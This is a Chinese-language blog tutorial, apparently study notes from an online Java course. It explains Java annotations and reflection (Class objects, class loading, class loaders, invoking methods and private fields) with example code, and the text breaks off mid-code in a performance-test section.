        <content type="html"><![CDATA[<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><p><a href="https://www.kuangstudy.com/">狂神说java官网</a></p><p><a href="https://www.bilibili.com/video/BV1p4411P7V3">B站视频链接</a></p><h1 id="注解Annotation"><a href="#注解Annotation" class="headerlink" title="注解Annotation"></a>注解Annotation</h1><p>注解可以被其他程序（比如编译器）读取。 注解以”@注释名“在代码中存在，还可以添加一些参数值，例如<code>@SuppressWarnings(value = &quot;unchecked&quot;)</code>。注解可以附加在package、class、method、field等上面。相当于给他们添加了额外的辅助信息，可以通过反射机制编程实现对这些元数据的访问。</p><h2 id="内置注解"><a href="#内置注解" class="headerlink" title="内置注解"></a>内置注解</h2><ul><li><code>@Override</code>：只适用于修辞方法，表示一个方法声明打算重写超类中的另一个方法声明。</li><li><code>@Deprecated</code>：可以用来修辞方法、属性、类，表示不鼓励开发者使用这样的元素，因其很危险或者存在更好的选择。</li><li>@<code>SuppressWarnings</code>：用来抑制编译时的警告信息，需要添加一个参数才能正常使用，这些参数都是已经定义好的，选择性使用即可。<ul><li><code>@SuppressWarnings(&quot;all&quot;)</code></li><li><code>@SuppressWarnings(&quot;unchecked&quot;)</code></li><li><code>@SuppressWarnings(value=&#123;&quot;unchecked&quot;,&quot;deprecated&quot;&#125;)</code></li></ul></li></ul><h2 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h2><p>元注解负责注解其他注解。Java定义了4个标准的meta-annotation类型，提供对其他annotation类型作说明。</p><ul><li><code>@Target</code>：用于描述注解的使用范围</li><li><code>@Retention</code>：表示需要在什么级别保存该注解信息，用于描述注解的生命周期<strong>（SOURCE&lt;CLASS&lt;RUNTIME）</strong></li><li><code>@Documented</code>：说明该注解将被包含在javadoc中</li><li><code>@Inherited</code>：说明子类可以<strong>继承</strong>父类中的该注解</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试注解</span></span><br><span class="line"><span class="meta">@MyAnnotation</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test01</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个注解</span></span><br><span class="line"><span class="meta">@Target(value = &#123;ElementType.METHOD, ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="meta">@Retention(value = RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Inherited</span></span><br><span class="line"><span class="meta">@interface</span> MyAnnotation &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h2><p>使用<code>@interface</code>自定义注解时，自动继承了<code>java.lang.annotation.Annotation</code>接口。</p><p>格式<code>public @interface name&#123;&#125;</code>。其中每一个方法实际上是声明了一个配置参数，方法名称就是参数名称，返回值类型就是参数类型（只能是基本类型Class、String、enum）。可以通过default声明参数默认值。如果只有一个参数，一般名为value。注解元素必须要有值，定义注解元素时经常使用空字符串或0作为默认值。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test02</span> &#123;</span><br><span class="line">   <span class="comment">//注解可以显式赋值，如果没有默认值，就必须赋值。</span></span><br><span class="line">   <span class="meta">@MyAnnotation2(name = &quot;Lfalive&quot;, place = &#123;&quot;重庆&quot;, &quot;武汉&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@MyAnnotation3(&quot;HUST&quot;)</span> <span class="comment">//因为参数名为value，所以可省略参数名</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test3</span><span class="params">()</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE, ElementType.METHOD&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@interface</span> MyAnnotation2 &#123;</span><br><span class="line">   <span class="comment">//注解的参数：参数类型 + 参数名</span></span><br><span class="line">   String <span class="title function_">name</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;张三&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> <span class="title function_">age</span><span class="params">()</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   String[] place();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE, ElementType.METHOD&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@interface</span> MyAnnotation3 &#123;</span><br><span class="line">   String <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="反射Reflection"><a href="#反射Reflection" class="headerlink" title="反射Reflection"></a>反射Reflection</h1><p><strong>动态语言：</strong>在运行时，代码可以根据某些条件改变自身结构。主要有Object-C、C#、JS、PHP、Python等。</p><p><strong>静态语言：</strong>运行时结构不可变的语言，如Java、C、C++。Java可以称之为“准动态语言”，即有一定动态性，可以利用<strong>反射机制</strong>获得类似动态语言的特性，让编程更加灵活。</p><p>反射机制允许程序在执行期间取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。</p><p>加载完类后，堆内存的方法区内就有了一个Class类型的对象，包含了类的结构信息。可以通过这个对象看到类的结构。</p><p><strong>优点：</strong>可以实现动态创建对象和编译，灵活。</p><p><strong>缺点：</strong>对性能有影响。使用反射基本上是一种解释操作，我们告诉JVM我们希望做什么并且它满足我们的要求，这类操作总是慢于直接执行相同的操作。</p><p>一个类在内存中只有一个Class对象，一个类被加载后，类的整个结构都会被封装在Class对象中。</p><h2 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h2><p>可以得到的信息：某个类的属性、方法和构造器、某个类到底实现了哪些接口。对于每个类而言，JRE都为其保留一个不变的Class类型的对象。一个Class对象包含了特定某个结构的有关信息。</p><ul><li>Class本身也是一个类</li><li>Class对象只能由系统建立对象</li><li>一个加载的类在JVM中只会有一个Class实例</li><li>每个Class对象对应的是一个加载到JVM中的一个.class文件</li><li>每个类的实例都会记得自己是由哪个Class实例所生成</li><li>通过Class可以完整地得到一个类中的所有被加载的结构</li><li>Class类是Reflection的根源</li></ul><p>常用方法：</p><p><img src="https://img.lfalive.top/Learn-java-Annotation/ClassMethod.JPG"></p><h2 id="获取Class类实例"><a href="#获取Class类实例" class="headerlink" title="获取Class类实例"></a>获取Class类实例</h2><p>若已知具体类，通过类的class属性获取。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;Teacher&gt; c3 = Teacher.class;</span><br></pre></td></tr></table></figure><p>已知某个类的实例，调用该实例的getClass()方法获取Class对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">Person</span>&gt; c1 = person.getClass();</span><br></pre></td></tr></table></figure><p>已知一个类的全类名，可通过Class类的静态方法forName()获取，可能抛出异常。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; c2 = Class.forName(<span class="string">&quot;Student&quot;</span>);</span><br></pre></td></tr></table></figure><p>内置基本数据类型可以直接用<code>类名.Type</code>。还可以利用<code>ClassLoader</code>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflection01</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">      <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">      System.out.println(person);</span><br><span class="line">      <span class="comment">//通过对象获得</span></span><br><span class="line">      Class&lt;? <span class="keyword">extends</span> <span class="title class_">Person</span>&gt; c1 = person.getClass();</span><br><span class="line">      <span class="comment">//forname获得</span></span><br><span class="line">      Class&lt;?&gt; c2 = Class.forName(<span class="string">&quot;Student&quot;</span>);</span><br><span class="line">      <span class="comment">//通过类名.class</span></span><br><span class="line">      Class&lt;Teacher&gt; c3 = Teacher.class;</span><br><span class="line">      <span class="comment">//基本内置类型的Type属性</span></span><br><span class="line">      Class&lt;Integer&gt; c4 = Integer.TYPE;</span><br><span class="line">      <span class="comment">//获得父类类型</span></span><br><span class="line">      Class&lt;?&gt; c5 = c1.getSuperclass();</span><br><span class="line"></span><br><span class="line">      System.out.println(c1);</span><br><span class="line">      System.out.println(c2);</span><br><span class="line">      System.out.println(c3);</span><br><span class="line">      System.out.println(c4);</span><br><span class="line">      System.out.println(c5);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Person&#123;name=&#x27;&quot;</span> + name + <span class="string">&quot;&#x27;&#125;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.name = <span class="string">&quot;学生&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Teacher</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Teacher</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.name = <span class="string">&quot;老师&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-Annotation/TestClass.JPG"></p><p>哪些类型可以有Class对象？</p><ul><li>class：外部类，成员（成员内部类、静态内部类），局部内部类，匿名内部类</li><li>interface：接口</li><li>[]：数组</li><li>enum：枚举</li><li>annotation：注解</li><li>primitive type：基本数据类型</li><li>void</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflection02</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      Class&lt;Object&gt; c1 = Object.class; <span class="comment">//类</span></span><br><span class="line">      Class&lt;Runnable&gt; c2 = Runnable.class; <span class="comment">//接口</span></span><br><span class="line">      <span class="comment">// 只要元素类型和维度一样，就是同一个class</span></span><br><span class="line">      Class&lt;String[]&gt; c3 = String[].class; <span class="comment">//一维数组</span></span><br><span class="line">      Class&lt;<span class="type">int</span>[][]&gt; c4 = <span class="type">int</span>[][].class; <span class="comment">//二维数组</span></span><br><span class="line">      Class&lt;Override&gt; c5 = Override.class; <span class="comment">//注解</span></span><br><span class="line">      Class&lt;ElementType&gt; c6 = ElementType.class; <span class="comment">//枚举</span></span><br><span class="line">      Class&lt;Integer&gt; c7 = Integer.class; <span class="comment">//基本数据类型</span></span><br><span class="line">      Class&lt;Void&gt; c8 = <span class="keyword">void</span>.class; <span class="comment">//void</span></span><br><span class="line">      Class&lt;Class&gt; c9 = Class.class; <span class="comment">//Class</span></span><br><span class="line"></span><br><span class="line">      System.out.println(c1);</span><br><span class="line">      System.out.println(c2);</span><br><span class="line">      System.out.println(c3);</span><br><span class="line">      System.out.println(c4);</span><br><span class="line">      System.out.println(c5);</span><br><span class="line">      System.out.println(c6);</span><br><span class="line">      System.out.println(c7);</span><br><span class="line">      System.out.println(c8);</span><br><span class="line">      System.out.println(c9);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-Annotation/TestClass2.JPG"></p><h2 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h2><p><img src="https://img.lfalive.top/Learn-java-Annotation/LoadClass.JPG"></p><p><img src="https://img.lfalive.top/Learn-java-Annotation/LoadClass2.JPG"></p><p>什么时候会发生类的初始化？</p><ul><li><p>主动引用（会发生类的初始化）</p><ul><li>虚拟机启动，先初始化main方法所在的类</li><li>new一个类的对象</li><li>调用类的静态成员（除了final常量）和静态方法</li><li>使用java.lang.reflect包的方法对类进行反射调用</li><li>初始化一个类，如果其父类没有被初始化，先初始化其父类</li></ul></li><li><p>被动引用（不会发生类的初始化）</p><ul><li>访问一个静态域时，只有真正声明这个域的类才会初始化。当通过子类引用父类的静态变量，不会导致子类初始化</li><li>通过数组定义类的引用，不会触发此类的初始化</li><li>引用常量不会触发此类的初始化（常量在链接阶段就存入调用类的常量池中了）</li></ul></li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflection03</span> &#123;</span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Main类被加载&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">      <span class="comment">//主动引用</span></span><br><span class="line">      <span class="type">Son</span> <span class="variable">son</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Son</span>();</span><br><span class="line">      <span class="comment">//反射也会产生主动引用</span></span><br><span class="line">      Class.forName(<span class="string">&quot;Son&quot;</span>);</span><br><span class="line">      <span class="comment">//子类调用父类的静态属性，不会初始化Son类，会加载Faher类</span></span><br><span class="line">      System.out.println(Son.b);</span><br><span class="line">      <span class="comment">//不会产生类的引用的方法</span></span><br><span class="line">      Son[] array = <span class="keyword">new</span> <span class="title class_">Son</span>[<span class="number">5</span>];</span><br><span class="line">      <span class="comment">//不会初始化Son类和Faher类</span></span><br><span class="line">      System.out.println(Son.M);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span> &#123;</span><br><span class="line">   <span class="keyword">static</span> <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;父类被加载&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">extends</span> <span class="title class_">Father</span> &#123;</span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;子类被加载&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">M</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>类加载的作用：将class文件字节码内容加载到内存中，并将这些静态数据转换成方法区的运行时数据结构，然后在堆中生成一个代表这个类的java.lang.Class对象，作为方法区中类数据的访问入口。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflection04</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">      <span class="comment">//获取系统的类加载器</span></span><br><span class="line">      <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">      System.out.println(systemClassLoader);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//获取系统类加载器的父类加载器--&gt;扩展类加载器</span></span><br><span class="line">      <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> systemClassLoader.getParent();</span><br><span class="line">      System.out.println(parent);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//获取扩展类加载器的父类加载器--&gt;引导类加载器(C/C++编写的，该加载器无法直接获取)</span></span><br><span class="line">      <span class="type">ClassLoader</span> <span class="variable">parent1</span> <span class="operator">=</span> parent.getParent();</span><br><span class="line">      System.out.println(parent1);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//测试当前类是哪个加载器</span></span><br><span class="line">      System.out.println(Class.forName(<span class="string">&quot;Person&quot;</span>).getClassLoader());</span><br><span class="line">      <span class="comment">//测试JDK内置类是哪个加载器</span></span><br><span class="line">      System.out.println(Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getClassLoader());</span><br><span class="line">      <span class="comment">//如何获得系统类加载器可以加载的路径</span></span><br><span class="line">      System.out.println(System.getProperty(<span class="string">&quot;java.class.path&quot;</span>));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-Annotation/Classloader.JPG"></p><h2 id="获取运行时类的完整结构"><a href="#获取运行时类的完整结构" class="headerlink" title="获取运行时类的完整结构"></a>获取运行时类的完整结构</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Person&#123;name=&#x27;&quot;</span> + name + <span class="string">&quot;&#x27;&#125;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.name = <span class="string">&quot;学生&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.age = age;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;run&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflection05</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ReflectiveOperationException &#123;</span><br><span class="line">      Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">      System.out.println(aClass.getName()); <span class="comment">//获得包名+类名</span></span><br><span class="line">      System.out.println(aClass.getSimpleName()); <span class="comment">//获得类名</span></span><br><span class="line">      System.out.println(<span class="string">&quot;==========================&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//获得类的属性</span></span><br><span class="line">      Field[] fields = aClass.getFields(); <span class="comment">//只能找到public属性</span></span><br><span class="line">      <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">         System.out.println(field);</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">&quot;==========================&quot;</span>);</span><br><span class="line">      fields = aClass.getDeclaredFields(); <span class="comment">//可以找到全部属性</span></span><br><span class="line">      <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">         System.out.println(field);</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">&quot;==========================&quot;</span>);</span><br><span class="line">      System.out.println(aClass.getField(<span class="string">&quot;name&quot;</span>)); <span class="comment">//获得指定属性</span></span><br><span class="line">      System.out.println(<span class="string">&quot;==========================&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//获得类的方法</span></span><br><span class="line">      Method[] methods = aClass.getMethods(); <span class="comment">//获得本类及其父类的全部public方法</span></span><br><span class="line">      <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">         System.out.println(method);</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">&quot;==========================&quot;</span>);</span><br><span class="line">      Method[] declaredMethods = aClass.getDeclaredMethods(); <span class="comment">//获得本类的所有方法</span></span><br><span class="line">      <span class="keyword">for</span> (Method method : declaredMethods) &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;declared &quot;</span> + method);</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">&quot;==========================&quot;</span>);</span><br><span class="line">      <span class="comment">//因为有重载，所以getMethod方法有时候需要加参数parameterTypes</span></span><br><span class="line">      System.out.println(aClass.getMethod(<span class="string">&quot;toString&quot;</span>)); <span class="comment">//获得指定方法</span></span><br><span class="line">      System.out.println(<span class="string">&quot;==========================&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//获得构造器</span></span><br><span class="line">      Constructor[] constructors = aClass.getConstructors(); <span class="comment">//获得public构造器</span></span><br><span class="line">      <span class="keyword">for</span> (Constructor constructor : constructors) &#123;</span><br><span class="line">         System.out.println(constructor);</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">&quot;==========================&quot;</span>);</span><br><span class="line">      Constructor[] declaredConstructors = aClass.getDeclaredConstructors();</span><br><span class="line">      <span class="keyword">for</span> (Constructor declaredConstructor : declaredConstructors) &#123;</span><br><span class="line">         System.out.println(declaredConstructor);</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">&quot;==========================&quot;</span>);</span><br><span class="line">      System.out.println(aClass.getDeclaredConstructor(<span class="type">int</span>.class)); <span class="comment">//获得指定的构造器</span></span><br><span class="line">      System.out.println(<span class="string">&quot;==========================&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-Annotation/GetMethod.JPG"></p><h2 id="Class对象用来做什么"><a href="#Class对象用来做什么" class="headerlink" title="Class对象用来做什么"></a>Class对象用来做什么</h2><p>可以创建类的对象，可以通过反射调用类中的方法或者获取类中的属性。</p><p>调用方法时，<code>Object invoke(Object obj, Object[] args)</code>，<code>Object</code>对应原方法的返回值，若无返回值，则是<code>null</code>。若原方法为静态方法，形参<code>Object</code>可为<code>null</code>。若原方法形参列表为空，则<code>Object[] args</code>为<code>null</code>。若原方法声明为<code>private</code>，则需要在调用此<code>invoke()</code>方法前，显式调用方法对象的<code>setAccessible()</code>方法。</p><p>Method和Field、Constructor对象都有<code>setAccessible()</code>方法，是启动和禁用访问安全检查的开关。参数为true则在使用时取消java语言访问检查。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Person&#123;name=&#x27;&quot;</span> + name + <span class="string">&quot;&#x27;&#125;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.name = <span class="string">&quot;学生&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.age = age;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(<span class="type">int</span> para)</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;name=&quot;</span> + name + <span class="string">&quot;,age=&quot;</span> + age + <span class="string">&quot;,para=&quot;</span> + para);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflection06</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ReflectiveOperationException &#123;</span><br><span class="line">      Class&lt;?&gt; c1 = Class.forName(<span class="string">&quot;Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//通过构造器创建对象</span></span><br><span class="line">      <span class="type">Student</span> <span class="variable">student1</span> <span class="operator">=</span> (Student) c1.getDeclaredConstructor().newInstance(); <span class="comment">//无参构造</span></span><br><span class="line">      <span class="type">Student</span> <span class="variable">student2</span> <span class="operator">=</span> (Student) c1.getDeclaredConstructor(<span class="type">int</span>.class).newInstance(<span class="number">22</span>); <span class="comment">//调用有参构造</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">//通过反射调用普通方法</span></span><br><span class="line">      <span class="type">Method</span> <span class="variable">run</span> <span class="operator">=</span> c1.getDeclaredMethod(<span class="string">&quot;run&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line">      run.invoke(student1, <span class="number">111</span>); <span class="comment">//激活方法，传入对象和方法所需参数</span></span><br><span class="line">      run.invoke(student2, <span class="number">222</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//通过反射操作属性</span></span><br><span class="line">      <span class="type">Field</span> <span class="variable">age</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">      age.setAccessible(<span class="literal">true</span>); <span class="comment">//使private属性可以访问</span></span><br><span class="line">      age.set(student1, <span class="number">30</span>);</span><br><span class="line">      run.invoke(student1, <span class="number">666</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-Annotation/invoke.JPG"></p><h2 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflection07</span> &#123;</span><br><span class="line">   <span class="comment">//普通方式调用</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test01</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line"></span><br><span class="line">      <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000000000</span>; i++) &#123;</span><br><span class="line">         student.getAge();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="type">long</span> <span class="variable">endTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">      System.out.println(endTime - startTime);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//反射方式调用</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test02</span><span class="params">()</span> <span class="keyword">throws</span> 